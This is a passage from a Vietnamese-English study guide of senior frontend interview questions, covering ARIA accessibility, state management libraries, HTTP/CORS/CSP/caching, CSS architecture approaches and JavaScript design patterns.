- `aria-expanded="true/false"` - dropdown, accordion
- `aria-checked="true/false"` - custom checkbox
- `aria-disabled="true"` - disabled state

**3. Properties:**
- `aria-label="Close"` - label cho icon buttons
- `aria-describedby="help-text"` - liên kết help text
- `aria-live="polite"` - announce dynamic content (alerts)

**🔑 Best Practices:**

- **Semantic HTML**: `<button>`, `<nav>`, `<main>` thay vì divs
- **Keyboard nav**: Tab order logic, Enter/Space activate, Esc close
- **Screen reader testing**: NVDA (Windows), VoiceOver (Mac/iOS), TalkBack (Android)
- **Skip links**: "Skip to main content" cho skip navigation

**⚠️ Lỗi Thường Gặp:**
- `outline: none` không custom focus indicator → keyboard users lost
- Images không alt → screen readers "image"
- Color-only info (red = error) → colorblind users miss
- Auto-playing videos/carousels → disorienting

**💡 Kiến Thức Senior:**
- **Focus management**: Trap focus trong modals, restore sau close
- **Live regions**: `aria-live="polite"` (wait), `"assertive"` (interrupt)
- **Automated testing**: axe-core, jest-axe, Lighthouse CI
- **Manual testing**: Tab navigation, zoom 200%, screen reader walkthrough

> **Câu hỏi phỏng vấn Senior Frontend Developer**
> **Độ khó:** ⭐⭐⭐⭐ (Advanced)
> **Thời gian trả lời:** 12-15 phút

---
---

## 59. Q59: 🗂️ Q57: State Management Comparison - Redux vs Zustand vs Jotai

### P1: Tên câu hỏi: 🗂️ Q57: State Management Comparison - Redux vs Zustand vs Jotai

### P2: Trả lời (Senior):

## 60. Q60: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**

**"State management: Server state (React Query/SWR), Global state (Redux/Zustand/Jotai), Local state (useState). Redux = mature, boilerplate, DevTools. Zustand = simple, hooks-based. Jotai = atomic, granular. Chọn based on complexity."**

**🔑 So Sánh 3 Libraries:**

| **Aspect** | **Redux Toolkit** | **Zustand** | **Jotai** |
|-----------|------------------|------------|----------|
| **Philosophy** | Centralized store | Simple hooks | Atomic state |
| **Boilerplate** | Medium (RTK giảm) | Low | Very low |
| **Bundle size** | ~20KB | **~1KB** | **~3KB** |
| **Learning curve** | High | Low | Medium |
| **DevTools** | ✅ Best | ✅ Basic | ✅ Basic |
| **Async** | createAsyncThunk | Manual | Async atoms |
| **Use case** | Large apps, complex | Simple global state | Granular, React Suspense |

**🔑 Khi nào dùng cái gì:**

**1. Redux Toolkit:**
- **Large apps** với complex state logic
- Cần **time-travel debugging**, state persistence
- Team quen Redux patterns
- Middleware (logging, analytics)

**2. Zustand:**
- **Simple global state** (theme, auth status)
- Muốn **minimal boilerplate** + hooks-based
- Small-medium apps
- Dễ migrate từ Context API

**3. Jotai:**
- **Atomic/granular updates** - chỉ re-render affected components
- **React Suspense** integration
- Derived state (computed values)
- Bottom-up approach (atoms compose)

**⚠️ Lỗi Thường Gặp:**
- Dùng Redux cho server state → dùng React Query/SWR (cache, refetch, optimistic)
- Mọi state vào global store → unnecessary, dùng local state cho forms/UI
- Không normalize Redux state → nested updates phức tạp
- Zustand không immer → mutate state trực tiếp, dùng `immer` middleware

**💡 Kiến Thức Senior:**
- **State categories**: Server (React Query) | Global (Zustand) | Local (useState) | URL (React Router)
- **Redux Toolkit Query**: Built-in data fetching (alternative to React Query)
- **Jotai atoms**: Làm việc với React.lazy, Suspense boundaries
- **Zustand middleware**: persist (localStorage), immer (immutable updates), devtools

> **Câu hỏi phỏng vấn Senior Frontend Developer**
> **Độ khó:** ⭐⭐⭐⭐ (Advanced)
> **Thời gian trả lời:** 12-15 phút

---
---

## 61. Q61: 🌐 Q58: Networking & Browser Internals - Mạng & Nội Tế Trình Duyệt

### P1: Tên câu hỏi: 🌐 Q58: Networking & Browser Internals - Mạng & Nội Tế Trình Duyệt

### P2: Trả lời (Senior):

## 62. Q62: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (4-5 phút):**

**"HTTP/2 = multiplexing (1 TCP), HTTP/3 = QUIC (UDP, no TCP HoL). CORS = cross-origin security (preflight OPTIONS). CSP = prevent XSS. Cache: immutable, stale-while-revalidate. CDN = edge caching, băng thông, latency."**

**🔑 Network Fundamentals:**

**1. HTTP Versions:**
- **HTTP/1.1**: 1 request/connection, head-of-line blocking
- **HTTP/2**: Multiplexing (many requests/1 TCP), header compression (HPACK), server push
- **HTTP/3**: QUIC (UDP), faster handshake (0-RTT), no TCP HoL blocking
- **Impact**: HTTP/2/3 = fewer requests overhead, không cần concat files

**2. CORS (Cross-Origin Resource Sharing):**
- **Same-origin policy**: Browser block cross-origin requests
- **Simple requests**: GET/POST → check `Access-Control-Allow-Origin`
- **Preflight**: OPTIONS request trước PUT/DELETE/custom headers
- **Credentials**: `credentials: 'include'` + `Access-Control-Allow-Credentials: true`

**3. CSP (Content Security Policy):**
- **Prevent XSS**: Whitelist script sources
- Header: `Content-Security-Policy: script-src 'self' cdn.example.com`
- **Nonce**: `<script nonce="random123">` - random per request
- **Report-only mode**: Test CSP without blocking

**4. Browser Cache:**
- **`Cache-Control: immutable`**: File không bao giờ thay đổi (hashed filenames)
- **`stale-while-revalidate`**: Serve stale, fetch fresh background
- **`max-age=3600`**: Cache 1 giờ
- **ETag**: Validate cached file (304 Not Modified)

**5. CDN (Content Delivery Network):**
- **Edge caching**: Assets gần user (lower latency)
- **Bandwidth**: Offload origin server
- **Security**: DDoS protection, WAF

**⚠️ Lỗi Thường Gặp:**
- CORS errors → check server headers, proxy trong dev
- Không cache static assets → waste bandwidth
- CSP too strict → break inline scripts, dùng nonces
- HTTP/1.1 concat files → không cần với HTTP/2

**💡 Kiến Thức Senior:**
- **DNS prefetch**: `<link rel="dns-prefetch" href=" // Chú giải: cdn.example.com">`
- **Preconnect**: Early TCP+TLS handshake
- **Brotli compression**: Better than gzip (~20% smaller)
- **Service Workers**: Network proxy, offline caching, cache strategies

> **Câu hỏi phỏng vấn Senior Frontend Developer**
> **Độ khó:** ⭐⭐⭐⭐⭐ (Advanced)
> **Thời gian trả lời:** 15-25 phút---
---

## 63. Q63: 🎨 Q59: CSS Architecture & Modern Styling Approaches

### P1: Tên câu hỏi: 🎨 Q59: CSS Architecture & Modern Styling Approaches

### P2: Trả lời (Senior):

## 64. Q64: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**

**"CSS approaches: BEM (naming convention), CSS Modules (scoped), CSS-in-JS (dynamic, colocated), Tailwind (utility-first). Chọn based on: team size, dynamic needs, performance priority. Critical CSS = above-fold styles inline."**

**🔑 4 Modern Approaches:**

**1. BEM (Block Element Modifier):**
- **Naming**: `.block__element--modifier`
- Ưu: Clear, không conflicts, team-friendly
- Nhược: Verbose (dài), manually maintain
- Use case: Large teams, design systems

**2. CSS Modules:**
- **Scoped**: `import styles from './Button.module.css'`
- Ưu: Auto-scoped, no naming conflicts, works with existing CSS
- Nhược: Không dynamic (can't change based on props easily)
- Use case: Component libraries, gradual migration

**3. CSS-in-JS (Styled Components, Emotion):**
- **Syntax**: `const Button = styled.button\`color: ${props => props.color}\``
- Ưu: **Dynamic**, colocated, scoped, TypeScript support
- Nhược: Runtime overhead (~10-20ms), bundle size
- Use case: Highly dynamic UIs, design tokens

**4. Tailwind CSS:**
- **Utility-first**: `className="bg-blue-500 hover:bg-blue-700 px-4 py-2"`
- Ưu: **Fast development**, small final bundle (PurgeCSS), consistent design
- Nhược: HTML "bloat", learning curve (utility names)
- Use case: Rapid prototyping, startups, landing pages

**🔑 Critical CSS:**

- **Inline above-fold CSS** trong `<head>` để render nhanh
- Defer non-critical CSS (`<link rel="preload" as="style">`)
- Tools: Critters (Next.js), Critical (npm package)
- **FCP improvement**: ~30-50% faster First Contentful Paint

**⚠️ Lỗi Thường Gặp:**
- CSS-in-JS trong SSR không extract styles → FOUC (Flash of Unstyled Content)
- Tailwind không purge → 300KB+ CSS bundle
- BEM không consistent naming → mất ưu điểm
- Global CSS specificity wars → `!important` hell

**💡 Kiến Thức Senior:**
- **Zero-runtime CSS-in-JS**: Linaria, Vanilla Extract - extract CSS build time
- **Atomic CSS**: Tailwind, StyleX (Meta) - share utility classes
- **Design tokens**: CSS variables cho themes, dùng với Tailwind/CSS-in-JS
- **Container queries**: Style based on parent size (không phải viewport)

**❓ Câu Hỏi:**

So sánh các phương pháp styling hiện đại: CSS-in-JS (Styled Components, Emotion), Tailwind CSS, CSS Modules, BEM methodology. Khi nào nên dùng approach nào? Critical CSS là gì?

---
---

## 65. Q65: 🏗️ Q60: JavaScript Design Patterns for Frontend Development

### P1: Tên câu hỏi: 🏗️ Q60: JavaScript Design Patterns for Frontend Development

### P2: Trả lời (Senior):

## 66. Q66: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (4-5 phút):**

**"Design patterns: Singleton (1 instance), Observer (subscribe changes), Factory (create objects), Module (encapsulation), Pub/Sub (event-driven), Dependency Injection (loose coupling). Modern: Hooks patterns, Compound Components."**

**🔑 6 Essential Patterns:**

**1. Singleton - Single Instance:**
- **Use case**: Database connection, config object, logger
- **JS**: Module exports object (auto-singleton), class với static instance
- **Caution**: Hard to test (global state), avoid unless necessary

**2. Observer - Subscribe to Changes:**
- **Use case**: Event listeners, state management, reactive programming
- **Pattern**: Subject maintains observers list, notify on change
- **Modern**: RxJS Observables, MobX, Vue reactivity

**3. Pub/Sub (Publish-Subscribe):**
- **Khác Observer**: Decoupled (event bus giữa publisher/subscriber)
- **Use case**: Cross-component communication, analytics events
- **Implementation**: EventEmitter, window.postMessage, Redux

**4. Factory - Object Creation:**
- **Use case**: Create objects without specifying exact class
- **Example**: `React.createElement()`, component factories
- **Benefits**: Flexibility, hide complexity

**5. Module Pattern - Encapsulation:**
- **ES6 Modules**: `export/import` - native encapsulation
- **IIFE**: `(function(){ ... })()` - private scope (legacy)
- **Use case**: Libraries, utilities, prevent global pollution

**6. Dependency Injection:**
- **Pattern**: Pass dependencies (không hard-code)
- **Use case**: Testing (mock dependencies), loose coupling
- **React**: Props, Context API, custom hooks

**🔑 Modern React Patterns:**

- **Compound Components**: `<Select>` + `<Option>` share state
- **Render Props**: `<DataProvider render={data => ...} />`
- **Higher-Order Components** (HOC): `withAuth(Component)`
- **Custom Hooks**: `useAuth()`, `useFetch()` - reusable logic

**⚠️ Lỗi Thường Gặp:**
- Over-engineering: Dùng patterns không cần thiết → complexity
- Singleton abuse → global state, hard test
- Observer memory leaks → forget unsubscribe
- Pub/Sub không type-safe → dùng TypeScript event types

**💡 Kiến Thức Senior:**
- **Strategy Pattern**: Interchangeable algorithms (sort strategies, payment methods)
- **Command Pattern**: Undo/redo functionality (Redux actions)
- **Proxy Pattern**: ES6 Proxy cho reactivity (Vue 3, MobX)
- **Facade Pattern**: Simplify complex APIs (Axios wraps fetch, jQuery wraps DOM)

**❓ Câu Hỏi:**

Giải thích các Design Patterns phổ biến trong JavaScript/TypeScript frontend: Singleton, Observer, Factory, Module, Pub/Sub, Prototype, Dependency Injection. Khi nào nên dùng pattern nào?

---